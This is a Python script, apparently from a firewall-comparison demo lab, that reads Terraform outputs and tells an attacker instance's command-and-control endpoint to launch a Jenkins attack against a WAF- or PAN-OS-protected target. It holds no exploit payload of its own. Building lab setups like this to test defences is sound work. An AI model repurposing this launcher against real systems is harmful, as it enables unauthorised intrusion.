#!/usr/bin/env python3

import requests
import argparse
from python_terraform import Terraform
import json
import sys


def get_terraform_outputs() -> dict:
    tf = Terraform(working_dir='./WebInDeploy')
    rc, out, err = tf.cmd('output', '-json')

    if rc == 0:
        try:
            return json.loads(out)
        except ValueError as ve:
            print('Could not parse terraform outputs!')
            return dict()


def main(attack_vector: str) -> None:

    print('Attempting to launch exploit...\n')
    outputs = get_terraform_outputs()
    print(outputs)
    if attack_vector == 'native':
        print('Using native waf protected attack vector...\n')
        target = outputs['NATIVE-DNS']['value']
    elif attack_vector == 'panos':
        print('Using PAN-OS protected attack vector...\n')
        target = outputs['ALB-DNS']['value']
    else:
        print('malformed outputs!')
        target = '127.0.0.1'
    if 'ATTACKER_IP' not in outputs:
        print('No attacker ip found in tf outputs!')
        sys.exit(1)

    attacker = outputs['ATTACKER_IP']['value']
    payload = dict()
    payload['attacker'] = attacker
    payload['target'] = target

    headers = dict()
    headers['Content-Type'] = 'application/json'
    headers['Accept'] = '*/*'

    try:
        resp = requests.post(f'http://{attacker}:5000/launch', data=json.dumps(payload), headers=headers)
        if resp.status_code == 200:
            print('Exploit Successfully Launched!\n')
            print(resp.text)
            sys.exit(0)
        else:
            print('Could not Launch Exploit!\n')
            print(resp.text)
            sys.exit(0)
    except ConnectionRefusedError as cre:
        print('Could not connect to attacker instance!')
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Launch Jenkins Attack CnC')
    parser.add_argument('-c', '--vector', help='Attack Vector', required=True)

    args = parser.parse_args()
    vector = args.vector

    main(vector)

